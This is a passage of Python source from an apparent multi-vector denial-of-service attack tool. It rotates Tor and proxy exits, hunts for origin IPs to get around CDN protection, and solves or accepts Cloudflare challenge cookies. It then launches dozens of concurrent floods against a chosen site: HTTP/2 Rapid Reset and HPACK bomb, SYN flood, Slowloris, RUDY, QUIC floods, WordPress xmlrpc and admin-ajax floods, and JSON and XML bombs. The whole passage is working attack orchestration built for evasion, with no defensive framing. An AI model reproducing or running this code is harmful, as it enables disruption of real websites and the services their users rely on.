                        print(f" {c('g','[+]')} Tor proxies: {_tor_addrs}")
        except ImportError:
            print(f" {c('y','[!]')} tor_manager not available - using fallback")
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
        except Exception as e:
            print(f" {c('r','[-]')} Tor setup error: {e}")
            for i in range(min(tor_instances, 5)):
                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
    if use_proxy:
        try:
            opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
            pool = opts.get("proxy_pool")
            if pool is not None:
                for plist in getattr(pool, "_pools", {}).values():
                    for ps in plist:
                        u = getattr(ps, "url", None)
                        if u:
                            proxy_urls.append(u)
                for ps in getattr(pool, "_pending", []) or []:
                    u = getattr(ps, "url", None)
                    if u:
                        proxy_urls.append(u)
        except Exception as e:
            print(f" {c('y','[!]')} proxy setup: {e}")

    # ----- Origin discovery (keep CDN detection result from above if found) -----
    parsed = urlparse(target)
    hostname = parsed.hostname or ""
    if not origin_ip:
        from core.recon.origin.origin_store import load_hunt, get_best_origin
        saved = load_hunt(target)
        if saved and (saved.get("verified_origins") or saved.get("candidates")):
            best = get_best_origin(target)
            if best:
                origin_ip = best
                print(f" {c('g','[+]')} Found saved origin: {origin_ip}")
    if not origin_ip:
        if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
            from core.recon.origin.origin_hunter import OriginHunter
            env = load_env()
            print(f" {c('c','[*]')} Hunting origin IP...")
            hunter = OriginHunter(timeout=8, max_concurrent=200)
            report = await hunter.hunt(target, env=env)
            if report.verified_origins:
                origin_ip = report.verified_origins[0]
                print(f" {c('g','[+]')} ORIGIN: {origin_ip}")
            elif report.candidates:
                origin_ip = report.candidates[0].ip
                print(f" {c('y','[*]')} Candidate: {origin_ip}")
            else:
                print(f" {c('y','[!]')} No origin found")

    # Build effective target URL (origin bypass)
    effective_url = target
    host_header = parsed.hostname or ""
    if origin_ip:
        scheme = parsed.scheme or "https"
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        effective_url = f"{scheme}://{origin_ip}{path}"
        print(f" {c('g','[+]')} Origin bypass: {origin_ip} (Host: {host_header})")

    print(f"\n {c('c','[*]')} MIXED v2 | {target} | {duration}s | {rps} RPS | proxies={len(proxy_urls)}")
    _rich_sep()

    # ----- Launch live AutoDashboard + H2 Killer workers -----
    from core.monitor.auto_dashboard import AutoDashboard
    from core.attack.engines.h2_exhaust import run_h2_exhaust
    from core.attack.engines.h2_hold_engine import run_hold_worker
    import threading as _th
    import queue as _queue

    dash = AutoDashboard(
        target=effective_url, duration=duration,
        target_rps=rps, stalled_ms=8000, refresh_ms=50,
    )

    vectors = [
        ("killer_1", "H2 Exhaust", 0.20, 4),
        ("killer_2", "H2 Exhaust", 0.20, 4),
        ("killer_3", "H2 Exhaust", 0.15, 3),
        ("killer_4", "H2 Exhaust", 0.15, 3),
        ("killer_5", "H2 Exhaust", 0.10, 2),
        ("killer_6", "H2 Exhaust", 0.10, 2),
        ("killer_7", "H2 Exhaust", 0.07, 2),
        ("killer_8", "H2 Exhaust", 0.03, 1),
    ]
    for name, label, _share, _conns in vectors:
        dash.register_vector(name, label)

    dash.set_engine_label(f"mixed_v2 origin={origin_ip or '-'}")
    dash.set_global_note("MIXED ATTACK V2 — H2 Exhaust")
    dash.start()

    handles = []
    for name, label, share, conns in vectors:
        wrps = max(1000, int(rps * share))
        stop_evt = _th.Event()
        result: dict = {}
        proxy_q = dash.get_stats_queue()

        class _Proxy:
            def __init__(self, vn):
                self.vn = vn
            def put_nowait(self, item):
                if isinstance(item, dict):
                    item["vector_name"] = self.vn
                proxy_q.put_nowait(item)
            def get_nowait(self):
                return proxy_q.get_nowait()

        th = _th.Thread(
            target=run_h2_exhaust,
            name=f"mixed_{name}",
            kwargs=dict(
                target_url=effective_url, rps=wrps,
                duration=float(duration), worker_id=abs(hash(name)) & 0xFFFF,
                stats_queue=_Proxy(name), stop_event=stop_evt,
                host_header=host_header, connections=conns,
                result_dict=result,
            ),
            daemon=True,
        )
        th.start()
        handles.append((th, stop_evt, result, name))

    # Also start connection-hold engine
    hold_stop = _th.Event()
    hold_result = {}
    hold_q = _queue.Queue()
    class _HoldProxy:
        def put_nowait(self, item):
            if isinstance(item, dict):
                item["vector_name"] = "hold"
            hold_q.put_nowait(item)
        def get_nowait(self):
            return hold_q.get_nowait()
    hold_conn_target = min(1000, max(200, duration * 2))
    hold_th = _th.Thread(
        target=run_hold_worker,
        name="mixed_hold",
        kwargs=dict(
            target_url=effective_url, duration=float(duration),
            worker_id=9999, stats_queue=_HoldProxy(), stop_event=hold_stop,
            host_header=host_header, connections=hold_conn_target,
        ),
        daemon=True,
    )
    hold_th.start()
    handles.append((hold_th, hold_stop, hold_result, "hold"))
    print(f"  {c('g','[+]')} H2 connection hold: {hold_conn_target} targets")

    try:
        end_at = time.time() + duration
        while time.time() < end_at:
            await asyncio.sleep(0.5)
            if not any(h[0].is_alive() for h in handles):
                break
    except KeyboardInterrupt:
        print(f"\n {c('y','[!]')} Cancelled.")

    for _th_obj, evt, _r, _n in handles:
        evt.set()
    for th_obj, _e, _r, _n in handles:
        try:
            await asyncio.get_event_loop().run_in_executor(None, th_obj.join, 5.0)
        except Exception:
            pass

    agg = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
    for _th_obj, _e, r, _n in handles:
        agg["total_requests"] += int(r.get("sent", 0))
        agg["completed"]      += int(r.get("completed", 0))
        agg["failed"]         += int(r.get("failed", 0))
        agg["timeout"]        += int(r.get("timeout", 0))

    await asyncio.sleep(0.5)
    dash.stop()
    print_attack_summary(target, duration, agg)

async def run_auto_mode(target: str, cfg: dict):
    """
    Auto Mode entry point with integrated bypass modules.
    
    Features:
    - FlareSolverr auto-detection (solves Cloudflare challenges)
    - HTTP/2 fingerprint impersonation
    - WAF parsing bypass probing
    - Behavioral evasion with browser pool
    - Origin discovery with 18 sources
    """
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    env = load_env()
    bypass = load_bypass_flags(env)
    
    _RICH_CONSOLE.print()
    _RICH_CONSOLE.print(Panel("[bold cyan]AUTO MODE V2 - SMART BYPASS INTEGRATION[/]", 
                               border_style="cyan", box=box.HEAVY))
    
    # Show active bypass features
    active = [k for k, v in bypass.items() if v]
    inactive = [k for k, v in bypass.items() if not v]
    if active:
        _RICH_CONSOLE.print(f"[bold green][+][/] Active bypass: [white]{', '.join(active)}[/]")
    if inactive:
        _RICH_CONSOLE.print(f"[bold yellow][!][/] Disabled bypass: [dim]{', '.join(inactive)}[/]")
    
    # PHASE 0: FLARESOLVERR AUTO-DETECT
    flaresolverr_ok = False
    if bypass.get("flaresolverr", True) and cfg.get("flaresolverr", {}).get("enabled", True):
        _RICH_CONSOLE.print()
        _RICH_CONSOLE.print("[bold cyan][*][/] Phase 0: FlareSolverr Auto-Detection")
        flaresolverr_ok, fs_endpoint = check_flaresolverr()
        if flaresolverr_ok:
            _RICH_CONSOLE.print("[bold green][+][/] Cloudflare challenges will be solved automatically")
            # Initialize FlareSolverr client
            try:
                from core.network.flaresolverr_client import flaresolverr_client
                flaresolverr_client._endpoint = fs_endpoint
                flaresolverr_client.start()
            except Exception as e:
                _RICH_CONSOLE.print(f"[bold yellow][!][/] FlareSolverr init error: {e}")
    
    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
    target_rps = int(get_input(" Target RPS (default 8000): ") or "8000")

    # Unified attack mode menu (replaces messy Tor + proxy chains)
    print()
    print(f" {c('c','[*]')} Attack mode:")
    print(f"   {c('c','[1]')} Direct (origin IP only, no Tor / no proxy) {c('g','[fastest]')}")
    print(f"   {c('c','[2]')} Tor network (auto-rotate exit nodes for CF bypass) {c('g','[recommended]')}")
    print(f"   {c('c','[3]')} Proxy pool (load proxies/*.txt, validate, rotate)")
    print(f"   {c('c','[4]')} Tor + Proxy (BOTH - max evasion)")
    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")

    use_tor = mode in ("2", "4")
    use_proxy = mode in ("3", "4")
    tor_instances = 0
    proxy_pool = None
    origin_ip: Optional[str] = None

    # Origin IP prompt (CF bypass) - applies to all modes
    parsed = urlparse(target)
    hostname = parsed.hostname or ""
    print(f" {c('c','[*]')} Target type: domain/URL ({hostname})")

    # Try saved origin first
    try:
        from core.recon.origin.origin_store import load_hunt, get_best_origin
        saved = load_hunt(target)
        if saved and (saved.get("verified_origins") or saved.get("candidates")):
            best = get_best_origin(target)
            if best:
                print(f" {c('g','[+]')} Found saved origin IP: {c('w', best)}")
                if get_input(f"   Use saved origin for bypass? (Y/n): ").lower() != "n":
                    origin_ip = best
    except Exception:
        pass

    if not origin_ip:
        if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
            from core.recon.origin.origin_hunter import OriginHunter

            # PRE-CHECK: Is target actually behind a CDN?
            cdn_detected = False
            direct_ip = None
            try:
                import socket as _socket
                loop = asyncio.get_event_loop()
                direct_ip = await loop.run_in_executor(None, _socket.gethostbyname, hostname)
            except Exception:
                pass
            try:
                import requests as _req
                probe = await loop.run_in_executor(
                    None,
                    lambda: _req.head(target, timeout=5, allow_redirects=False,
                                      headers={"User-Agent": "Mozilla/5.0"})
                )
                srv = (probe.headers.get("Server") or "").lower()
                cdn_markers = ("cloudflare", "akamai", "fastly", "cloudfront",
                               "imperva", "incapsula", "sucuri")
                cdn_detected = (
                    "cf-ray" in {k.lower() for k in probe.headers.keys()}
                    or any(m in srv for m in cdn_markers)
                )
            except Exception:
                pass

            if not cdn_detected and direct_ip:
                origin_ip = direct_ip
                print(f" {c('g','[+]')} No CDN detected — using DNS origin: {c('w', direct_ip)}")
            else:
                if cdn_detected:
                    print(f" {c('c','[*]')} CDN detected — hunting real origin IP...")
                else:
                    print(f" {c('c','[*]')} Hunting origin IP...")
                hunter = OriginHunter(timeout=8)
                try:
                    report = await asyncio.wait_for(hunter.hunt(target, env=env), timeout=45)
                    if report.verified_origins:
                        origin_ip = report.verified_origins[0]
                        print(f" {c('g','[+]')} Origin found: {origin_ip}")
                    elif report.candidates:
                        origin_ip = report.candidates[0].ip
                        print(f" {c('y','[*]')} Best candidate: {origin_ip}")
                    elif direct_ip:
                        origin_ip = direct_ip
                        print(f" {c('y','[*]')} Falling back to DNS origin: {direct_ip}")
                    else:
                        print(f" {c('y','[!]')} No origin found - hitting target directly")
                except asyncio.TimeoutError:
                    if direct_ip:
                        origin_ip = direct_ip
                        print(f" {c('y','[!]')} Origin hunt timed out - using DNS origin: {direct_ip}")
                    else:
                        print(f" {c('y','[!]')} Origin hunt timed out - hitting target directly")

    if use_proxy:
        try:
            opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
            proxy_pool = opts.get("proxy_pool")
            if proxy_pool is None:
                _RICH_CONSOLE.print(f"[bold yellow][!][/] No proxy pool loaded - falling back to direct mode")
        except Exception as e:
            _RICH_CONSOLE.print(f"[bold yellow][!][/] proxy setup failed: {e}")
    
    # PHASE 0.5: CF CHALLENGE SOLVE
    cf_cookies = None
    if not flaresolverr_ok:
        _RICH_CONSOLE.print()
        _RICH_CONSOLE.print("[bold cyan][*][/] Phase 0.5: Cloudflare Challenge Solver")
        
        # Pre-check: is target actually behind Cloudflare?
        import requests as _req
        _cf_detected = False
        try:
            _probe = _req.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
            _cf_detected = "CF-Ray" in _probe.headers or _probe.headers.get("Server", "").lower() == "cloudflare"
        except:
            pass
        
        if not _cf_detected:
            _RICH_CONSOLE.print("[bold green][+][/] No Cloudflare detected — skipping challenge solver")
        else:
            try:
                from core.network.cf_solver import solve_challenge
                _RICH_CONSOLE.print("[bold yellow][*][/] Attempting to solve Cloudflare challenge...")
                cf_cookies = await solve_challenge(target, headless=True, timeout=45)
                if cf_cookies:
                    _RICH_CONSOLE.print(f"[bold green][+][/] Challenge solved! Got {len(cf_cookies)} cookies")
                else:
                    _RICH_CONSOLE.print("[bold yellow][!][/] Auto-solve failed.")
                    manual = get_input(" Paste cf_clearance cookie value (or Enter to skip): ").strip()
                    if manual:
                        cf_cookies = {"cf_clearance": manual}
                        _RICH_CONSOLE.print("[bold green][+][/] Manual cf_clearance injected")
            except Exception as e:
                _RICH_CONSOLE.print(f"[bold yellow][!][/] CF solver error: {e}")
    
    # V3 UPGRADE: Combined SYN Flood + Rapid Reset (when origin IP is known)
    use_v3 = False
    if origin_ip:
        print()
        print(f" {c('c','[*]')} Auto Mode V3 available: Combined SYN Flood + Rapid Reset")
        print(f"   {c('g','[+]')} SYN flood -> origin IP ({origin_ip})")
        print(f"   {c('g','[+]')} Rapid Reset via Tor (auto-rotate)")
        print(f"   {c('g','[+]')} Auto-detect 403/Connection reset -> ganti IP")
        v3_choice = get_input(" Use V3 combined attack? (Y/n): ").strip().lower()
        use_v3 = v3_choice != "n"
    
    if use_v3:
        # V3: SYN+RapidReset — skip V2 fluff, langsung gas
        syn_thr = get_input(" SYN threads (default 1000): ").strip() or "1000"
        rr_thr = get_input(" RR threads (default 500): ").strip() or "500"
        tor_cnt = get_input(" Tor instances (default 15): ").strip() or "15"
        print(f"\n {c('c','[*]')} V3 Target: {c('w',target)}")
        print(f" {c('c','[*]')} V3 Origin: {c('w',origin_ip)} | SYN={syn_thr} | RR={rr_thr} | Tor={tor_cnt}")
        from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
        result = await run_auto_mode_v3(
            target=target,
            origin_ip=origin_ip,
            duration=duration,
            syn_threads=int(syn_thr),
            rr_threads=int(rr_thr),
            tor_instances=int(tor_cnt),
            rotation_interval=45,
        )
        return result

    # V3 not selected — continue with V2 launch info panel
    _RICH_CONSOLE.print()
    info_table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
    info_table.add_column("Key", style="bold white")
    info_table.add_column("Value")
    info_table.add_row("Target", f"[cyan]{target}[/]")
    info_table.add_row("Origin IP", f"[{'green' if origin_ip else 'red'}]{origin_ip or 'auto-discover'}[/]")
    info_table.add_row("Duration", f"{duration}s")
    info_table.add_row("Peak RPS", f"{target_rps}")
    info_table.add_row("Tor", f"[{'green' if tor_instances > 0 else 'red'}]{tor_instances} instances" if tor_instances > 0 else "[red]OFF[/]")
    info_table.add_row("Proxy Pool", f"[{'green' if proxy_pool else 'red'}]{len(proxy_pool) if proxy_pool else 'None'}[/]")
    info_table.add_row("HTTP/2", f"[{'green' if bypass.get('http2_impersonation') else 'red'}]{'ON' if bypass.get('http2_impersonation') else 'OFF'}[/]")
    info_table.add_row("FlareSolverr", f"[{'green' if flaresolverr_ok else 'red'}]{'ON' if flaresolverr_ok else 'OFF'}[/]")
    info_table.add_row("CF Cookies", f"[{'green' if cf_cookies else 'red'}]{'YES' if cf_cookies else 'NO'}[/]")
    _RICH_CONSOLE.print(Panel(info_table, title=f"[bold cyan]Launching Auto Mode V2[/]", border_style="cyan"))
    _RICH_CONSOLE.print()
    
    if use_tor:
        tor_input = get_input(" Tor instances (default 15): ").strip()
        tor_instances = max(3, int(tor_input)) if tor_input.isdigit() else 15
    else:
        tor_instances = 0
    
    try:

        # If bypass features are enabled, orchestrate with smart mode first
        if bypass.get("waf_parsing_bypass") or bypass.get("http2_impersonation"):
            _RICH_CONSOLE.print("[bold green][+][/] Smart bypass probing enabled - testing WAF evasion techniques...")
            try:
                from core.bypass.orchestrator import execute_advanced_attack
                # Quick probe with WAF bypass methods
                probe_result = await execute_advanced_attack(
                    target_url=target,
                    duration=min(duration, 10),
                    target_rps=10,
                    attack_mode='smart',
                    use_waf_bypass=bypass.get("waf_parsing_bypass", True),
                    use_http2_impersonation=bypass.get("http2_impersonation", True),
                    use_flaresolverr=flaresolverr_ok,
                )
                if probe_result.get('phases'):
                    probe_data = probe_result['phases'][0].get('results', {})
                    _RICH_CONSOLE.print(f"[bold green][+][/] WAF probe: {probe_data.get('working_methods', 'completed')}")
            except Exception as e:
                _RICH_CONSOLE.print(f"[bold yellow][!][/] Smart probe skipped: {e}")
        
        # Redirect to V3 (V2 merged into V3)
        _RICH_CONSOLE.print(f"\n[bold cyan][*][/] Using Auto Mode V3 engine (V2 merged into V3)")
        from core.attack.strategies.auto_mode_v3 import run_auto_mode_v3
        result = await run_auto_mode_v3(
            target=target,
            origin_ip=origin_ip or "",
            duration=duration,
            syn_threads=500,
            rr_threads=200,
            tor_instances=tor_instances,
            rotation_interval=45,
        )
        return result
    except ImportError as e:
        _RICH_CONSOLE.print(f"[bold red][-][/] Auto Mode V3 import failed: {e}")
        _RICH_CONSOLE.print("[bold yellow][*][/] Falling back to legacy auto mode")
        await run_auto_mode_legacy(target, cfg)
    except Exception as e:
        import traceback
        print(f" {c('r','[-]')} Auto Mode v2 error: {type(e).__name__}: {e}")
        print(traceback.format_exc())
        return


async def run_auto_mode_legacy(target: str, cfg: dict):
    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
    max_rps = int(get_input(" Max RPS per vector (default 5000): ") or "5000")

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    _rich_header("AUTO MODE - ADAPTIVE MULTI-VECTOR")

    # PHASE 0: BANDWIDTH DETECTION
    print(f" {c('c','[*]')} Phase 0: Connection Analysis")
    _rich_sep()
    try:
        from core.monitor.bandwidth_detector import detect_bandwidth
        bw = await detect_bandwidth()
        tier = bw["recommended"]["tier"]
        tier_color = {"FAST": "g", "MEDIUM": "y", "SLOW": "r", "VERY_SLOW": "r"}.get(tier, "y")
        print(f" {c(tier_color,'[+]')} Connection: {tier}  upload={bw['upload_mbps']:.0f}Mbps  latency={bw['latency_ms']:.0f}ms")
        if tier in ("SLOW", "VERY_SLOW"):
            print(f" {c('y','[!]')} Slow connection - vectors will be throttled")
            max_rps = min(max_rps, bw["recommended"]["max_rps"])
        safe_caps = bw["recommended"]
    except Exception as e:
        print(f" {c('y','[!]')} Bandwidth detect failed: {e}")
        safe_caps = {"tier": "MEDIUM", "max_rps": max_rps, "max_threads_per_vec": 100}

    # PHASE 1: RECON
    print(f"\n {c('c','[*]')} Phase 1: Target Reconnaissance")
    _rich_sep()

    profile = await auto_detect_target(target, verbose=True)
    if profile is None:
        print(f" {c('r','[-]')} Target unreachable")
        return
    
    # PHASE 1.5: TARGET FINGERPRINTING (WordPress Detection)
    print(f"\n {c('c','[*]')} Phase 1.5: Target Architecture Fingerprinting")
    _rich_sep()
    
    target_arch = None
    try:
        from core.recon.detection.target_fingerprint import detect_target_architecture, WordPressDetector
        target_arch = await detect_target_architecture(target)
        
        if target_arch.get("is_wordpress"):
            print(f" {c('g','[+]')} WordPress detected (confidence: {target_arch['confidence']:.0%})")
            if target_arch.get("version") != "unknown":
                print(f" {c('c','[*]')} Version: {target_arch['version']}")
            if target_arch.get("endpoints"):
                print(f" {c('c','[*]')} High-value endpoints found: {len(target_arch['endpoints'])}")
                for ep in target_arch["endpoints"][:5]:
                    print(f"     - {ep}")
        else:
            print(f" {c('c','[*]')} Target type: {target_arch.get('target_type', 'generic')}")
            if target_arch.get("technologies"):
                print(f" {c('c','[*]')} Technologies: {', '.join(target_arch['technologies'])}")
    except Exception as e:
        print(f" {c('y','[!]')} Fingerprinting failed: {e}")
        target_arch = {"target_type": "generic", "endpoints": []}

    # PHASE 2: ORIGIN HUNT
    origin_ip = ""
    bypass_cdn = False
    if profile.cdn != "none" or profile.waf != "none":
        print(f"\n {c('c','[*]')} Phase 2: Origin IP Discovery")
        _rich_sep()
        print(f" {c('y','[*]')} CDN/WAF detected: {profile.cdn}/{profile.waf}")
        try:
            from core.recon.origin.origin_hunter import OriginHunter
            from core.recon.origin.origin_store import load_hunt, get_best_origin
            cached = load_hunt(target)
            if cached:
                origin_ip = get_best_origin(target)
                if origin_ip:
                    print(f" {c('g','[+]')} Cached origin: {origin_ip}")
                    bypass_cdn = True
            if not origin_ip:
                print(f" {c('c','[*]')} Hunting origin IP (11 sources)...")
                env = load_env()
                hunter = OriginHunter(timeout=8, max_concurrent=200)
                report = await hunter.hunt(target, env=env)
                if report.verified_origins:
                    origin_ip = report.verified_origins[0]
                    bypass_cdn = True
                    print(f" {c('g','[+]')} VERIFIED: {origin_ip}")
                elif report.candidates and report.candidates[0].confidence >= 0.4:
                    origin_ip = report.candidates[0].ip
                    bypass_cdn = True
                    print(f" {c('y','[*]')} Candidate: {origin_ip} ({report.candidates[0].confidence:.0%})")
        except Exception as e:
            print(f" {c('y','[!]')} Origin hunt error: {e}")

    # PHASE 3: PROXY HARVEST & VALIDATION
    proxy_pool = None
    proxy_file_for_go = ""
    print(f"\n {c('c','[*]')} Phase 3: Proxy Pool Setup & Validation")
    _rich_sep()
    try:
        from core.network.proxy import ProxyPool
        import glob
        proxy_files = glob.glob("proxies/*.txt")
        if proxy_files:
            print(f" {c('g','[+]')} Found {len(proxy_files)} proxy files")
            proxy_pool = ProxyPool(connect_timeout=5)
            total = 0
            for pf in proxy_files[:3]:
                count = await proxy_pool.load_file(pf)
                total += count
            print(f" {c('c','[*]')} Loaded {total} proxies - validating against target...")
            
            # VALIDATE proxies against target URL
            proxy_pool._validator.set_target(target)
            alive = await proxy_pool.quick_validate(total, concurrency=40)
            print(f" {c('g','[+]')} Validation complete: {alive}/{total} proxies alive for this target")
            
            if alive > 0:
                # Export alive proxies for Go engine
                urls = []
                for plist in proxy_pool._pools.values():
                    for ps in plist:
                        urls.append(ps.url)
                if urls:
                    proxy_file_for_go = "proxies/_auto_mode_validated.txt"
                    import os
                    os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
                    with open(proxy_file_for_go, "w") as f:
                        f.write("\n".join(urls))
                    print(f" {c('g','[+]')} Exported {len(urls)} validated proxies for Go engine")
        else:
            print(f" {c('y','[*]')} No proxy files - auto-harvesting...")
            from core.network.proxy_harvester import auto_harvest_and_validate
            
            def progress_cb(stage, current, alive):
                if stage == "validate":
                    print(f"\r {c('c','[*]')} Validating: {current} checked, {alive} alive   ", end="", flush=True)
            
            result = await auto_harvest_and_validate(
                target_url=target, save_path="proxies/auto_harvest.txt",
                min_rtt_ms=3000, progress_cb=progress_cb
            )
            print()  # newline after progress
            if result['fast_alive'] > 0:
                print(f" {c('g','[+]')} Harvested & validated {result['fast_alive']} fast proxies")
                proxy_pool = ProxyPool(connect_timeout=5)
                await proxy_pool.load_file("proxies/auto_harvest.txt")
                proxy_file_for_go = "proxies/auto_harvest.txt"
            else:
                print(f" {c('y','[!]')} No alive proxies found - continuing without proxy")
    except Exception as e:
        print(f" {c('y','[!]')} Proxy setup failed: {e}")
        import traceback
        traceback.print_exc()

    # PHASE 4: ADAPTIVE VECTOR SELECTION
    print(f"\n {c('c','[*]')} Phase 4: Adaptive Attack Vector Selection")
    _rich_sep()
    
    primary_target = target
    primary_origin = origin_ip if bypass_cdn else ""
    
    # ADAPTIVE TARGETING: WordPress vs Generic
    adaptive_targets = []
    if target_arch and target_arch.get("is_wordpress"):
        print(f" {c('g','[+]')} WordPress mode: targeting high-value endpoints")
        from core.recon.detection.target_fingerprint import WordPressDetector
        wp_detector = WordPressDetector()
        adaptive_targets = wp_detector.get_high_value_endpoints(target_arch, target)
        if adaptive_targets:
            print(f" {c('c','[*]')} Adaptive targets: {len(adaptive_targets)} endpoints")
            for t in adaptive_targets[:3]:
                print(f"     - {t}")
    else:
        print(f" {c('c','[+]')} Generic mode: standard attack pattern")
        adaptive_targets = [target]
    
    vectors = []
    tasks = []
    
    def add_go_vector(label: str, method: str, vec_rps: int, threads: int = 100, custom_target: str = None, **kw):
        threads = min(threads, safe_caps.get("max_threads_per_vec", 100))
        vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
        vectors.append(vec)
        attack_target = custom_target if custom_target else primary_target
        tasks.append(run_go_engine(
            target=attack_target, duration=duration, rps=vec_rps,
            method=method, threads=threads, origin_ip=primary_origin,
            proxy_file=proxy_file_for_go,
            live_stats=vec, **kw,
        ))
    
    def add_py_vector(label: str, coro_factory):
        """
        Add Python vector with REAL-TIME live_stats updates.
        
        coro_factory: callable that takes live_stats dict and returns coroutine
                      OR a plain coroutine (legacy support)
        """
        vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
        vectors.append(vec)
        
        async def wrapper():
            try:
                # If coro_factory is callable, pass live_stats; else use directly
                if callable(coro_factory) and not asyncio.iscoroutine(coro_factory):
                    coro = coro_factory(vec)
                else:
                    coro = coro_factory
                
                result = await coro
                vec["status"] = "done"
                if isinstance(result, dict):
                    vec["stats"] = {
                        "total_requests": result.get("total", result.get("total_requests", 0)),
                        "completed": result.get("completed", 0),
                        "failed": result.get("failed", 0),
                        "timeout": result.get("timeout", 0),
                    }
                return result
            except Exception as e:
                logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
                vec["status"] = "error"
                vec["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        tasks.append(wrapper())
    
    # Core HTTP vectors
    add_go_vector("HTTP Flood", "http-flood", max_rps, threads=200)
    add_go_vector("Cache-Bypass", "cache-bypass", max_rps, threads=200)
    add_go_vector("Smuggling", "smuggling", max_rps // 4, threads=100)
    
    # WordPress-specific adaptive targeting
    if target_arch and target_arch.get("is_wordpress") and adaptive_targets:
        print(f" {c('g','[+]')} WordPress detected - adding targeted vectors")
        # Target xmlrpc.php if available
        xmlrpc_targets = [t for t in adaptive_targets if "xmlrpc.php" in t]
        if xmlrpc_targets:
            add_go_vector("WP XMLRPC Flood", "post-bomb", max_rps // 2, threads=100, custom_target=xmlrpc_targets[0])
        
        # Target wp-cron.php if available
        cron_targets = [t for t in adaptive_targets if "wp-cron.php" in t]
        if cron_targets:
            add_go_vector("WP Cron Exhaust", "http-flood", max_rps // 3, threads=100, custom_target=cron_targets[0])
        
        # Target admin-ajax.php if available
        ajax_targets = [t for t in adaptive_targets if "admin-ajax.php" in t]
        if ajax_targets:
            add_go_vector("WP Admin-Ajax Flood", "post-bomb", max_rps // 3, threads=100, custom_target=ajax_targets[0])
        
        # Target search endpoint (database intensive)
        search_targets = [t for t in adaptive_targets if "?s=" in t]
        if search_targets:
            add_go_vector("WP Search Flood", "http-flood", max_rps // 2, threads=150, custom_target=search_targets[0])
    
    # HTTP/2 vectors (if supported)
    if profile.supports_http2:
        print(f" {c('g','[+]')} HTTP/2 detected - adding H2 vectors")
        add_go_vector("Rapid Reset", "rapid-reset", max_rps, threads=200, rapid_reset=True)
        add_go_vector("HPACK Bomb", "hpack-bomb", max_rps // 2, threads=100)
        add_go_vector("Continuation", "continuation", max_rps // 2, threads=100)
        add_go_vector("Settings Flood", "settings-flood", 0, threads=100)
    
    # QUIC/HTTP/3 vectors (always probe)
    print(f" {c('g','[+]')} Adding QUIC/HTTP/3 vectors")
    add_go_vector("HTTP/3 Stream Hijack", "quic-stream-hijack", max_rps // 3, threads=50)
    add_go_vector("QUIC CID Flood", "quic-cid-flood", max_rps // 5, threads=50)
    add_go_vector("QUIC Crypto Exhaust", "quic-crypto-exhaust", 0, threads=50)
    
    # Resource exhaustion
    add_go_vector("Conn Exhaust", "conn-flood", 0, threads=100)
    add_go_vector("TLS Reneg", "tls-reneg", 0, threads=100)
    add_go_vector("POST Bomb", "post-bomb", 0, threads=100)
    add_go_vector("WS Storm", "ws-storm", 0, threads=100)
    
    # Python slow attacks (with proxy + live stats)
    from core.attack.engines.enhanced import run_enhanced_attack
    sl_target = target
    if origin_ip and bypass_cdn:
        parsed = urlparse(target)
        sl_target = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
    
    add_py_vector("Slowloris",
        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="slowloris",
                                       rps=500, proxy_pool=proxy_pool, live_stats=vec))
    add_py_vector("RUDY",
        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="rudy",
                                       rps=200, proxy_pool=proxy_pool, live_stats=vec))
    
    if proxy_pool and proxy_pool.stats().get("total", 0) > 0:
        print(f" {c('g','[+]')} Proxy pool active ({proxy_pool.stats().get('total', 0)} proxies)")
        add_py_vector(f"Proxy PPS ({proxy_pool.stats().get('total', 0)})",
            lambda vec: run_enhanced_attack(url=target, duration=duration, method="pps",
                                           rps=max_rps * 2, proxy_pool=proxy_pool, live_stats=vec))
    
    # API vectors (with proxy + live stats wrapper)
    print(f" {c('g','[+]')} Adding API architecture vectors")
    from core.attack.specialized.api_attacks import API_ATTACK_METHODS
    
    def _wrap_api_auto(func, **kwargs):
        async def runner(vec):
            try:
                return await func(live_stats=vec, **kwargs)
            except TypeError:
                result = await func(**kwargs)
                if isinstance(result, dict):
                    vec["stats"] = {
                        "total_requests": result.get("total", result.get("total_requests", 0)),
                        "completed": result.get("completed", 0),
                        "failed": result.get("failed", 0),
                        "timeout": result.get("timeout", 0),
                    }
                return result
        return runner
    
    add_py_vector("REST API",
        _wrap_api_auto(API_ATTACK_METHODS["api_rest_flood"],
                       url=target, duration=duration, rps=200, proxy_pool=proxy_pool))
    add_py_vector("GraphQL",
        _wrap_api_auto(API_ATTACK_METHODS["graphql_deep"],
                       url=target, duration=duration, rps=100, proxy_pool=proxy_pool))
    add_py_vector("gRPC",
        _wrap_api_auto(API_ATTACK_METHODS["grpc_flood"],
                       url=target, duration=duration, rps=100, proxy_pool=proxy_pool))
    add_py_vector("JSON Bomb",
        _wrap_api_auto(API_ATTACK_METHODS["json_bomb"],
                       url=target, duration=duration, rps=80, proxy_pool=proxy_pool))
    add_py_vector("XML Bomb",
        _wrap_api_auto(API_ATTACK_METHODS["xml_bomb"],
                       url=target, duration=duration, rps=60, proxy_pool=proxy_pool))
    
